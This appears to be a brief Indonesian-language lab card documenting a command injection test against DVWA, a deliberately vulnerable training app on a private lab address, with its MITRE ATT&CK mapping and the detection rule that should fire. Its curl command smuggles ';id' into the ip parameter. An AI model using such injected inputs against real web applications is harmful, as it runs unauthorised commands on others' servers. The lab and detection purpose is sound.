# Command Injection Attack

## Deskripsi
Command Injection memungkinkan attacker menjalankan perintah OS
melalui input aplikasi web yang tidak divalidasi.

## MITRE ATT&CK
- Tactic: Execution
- Technique: T1059 — Command and Scripting Interpreter

## Target
- URL: `http://192.168.217.130/DVWA/vulnerabilities/exec/`

## Attack Commands
```bash
SESS="PHPSESSID=YOUR_SESSION; security=low"

# Command Injection via GET
curl -s "http://192.168.217.130/DVWA/vulnerabilities/exec/?ip=127.0.0.1%3Bid&Submit=Submit" \
  -b "$SESS" -o /dev/null -w "Status: %{http_code}\n"
```

## Detection
- Rule ID: 100013
- Level: 12 (High)
- Auditd Rule: command_injection
